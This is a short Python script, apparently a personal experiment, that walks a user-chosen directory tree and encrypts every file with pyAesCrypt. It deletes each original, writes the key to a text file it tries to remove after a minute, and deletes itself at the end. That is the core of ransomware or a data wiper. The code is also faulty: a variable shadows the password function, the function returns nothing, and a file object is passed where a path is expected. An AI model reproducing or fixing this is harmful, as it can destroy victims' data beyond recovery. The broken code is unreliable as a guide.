import os
import sys
import pyAesCrypt
import random
import string
import time

#C:\Users\dhruv\OneDrive\Desktop\encryption_testing

#create a password
def password(length):

  chars = string.ascii_lowercase

  res = ''.join(random.choice(chars) for i in range(0, length))

  #Store password in txt file
  with open("password.txt", 'w') as f:
    f.write(res + "<------- Store this password somewhere safe. This file will delete in 1 minute") 
    time.sleep(60)
    os.remove(f)


def encrypt(file):
    print('-' * 80)
    password = password(16)
    #If errors come due to buffer size, just delete it
    buffer_size = 512*1024
    pyAesCrypt.encryptFile(str(file), str(file) + ".crp", password, buffer_size)
    print("[Encrypt] '"+str(file)+".crp'")
    os.remove(file)


def walk(dir):
    for name in os.listdir(dir):
        path = os.path.join(dir, name)
        if os.path.isfile(path):
            encrypt(path)
        else:
            walk(path)


dir = input("Enter your root directory here: ")
walk(dir)
print('-' * 80)
os.remove(str(sys.argv[0]))
